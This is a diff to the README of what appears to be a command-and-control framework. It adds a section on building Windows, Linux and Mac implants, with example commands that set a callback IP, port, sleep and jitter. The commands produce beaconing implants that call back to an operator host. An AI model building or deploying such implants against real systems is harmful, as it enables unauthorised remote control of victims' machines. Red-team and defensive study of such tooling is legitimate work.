@@ -56,6 +56,18 @@ sudo setcap 'cap_net_bind_service=+ep' ./target/release/anvil (allows anvil to b
 ./target/release/anvil (run without sudo)
 ```
 
+## Building Implants
+
+Implants are built from the main terminal in conduit, post auth to anvil c2 server. The implants are cross-compiled on the server and downloaded to local by the client. Currently there are 2 released windows variants, that can be built to exe, dll, or raw shellcode. The linux implant can target elf. Mac implants must be built locally by the operator, as they are not yet supported for cross-compilation by the server. Specify the callback ip and port, and then the sleep (in seconds) and jitter (percent of sleep variation). I've given examples below.
+
+```
+(from conduit terminal, example build functions)
+build linux elf <ip> <port> <sleep> <jitter>
+build windows exe 192.168.1.19 443 2 50
+build windows dll 192.168.1.19 443 2 50
+build windows_noldr raw 192.168.1.15 443 20 75
+```
+
 ## Database
 
 anvil creates a database using rusqlite (or sqlite). If you need to interact with it directly, I recommend the sqlite browser or sqlite cli.
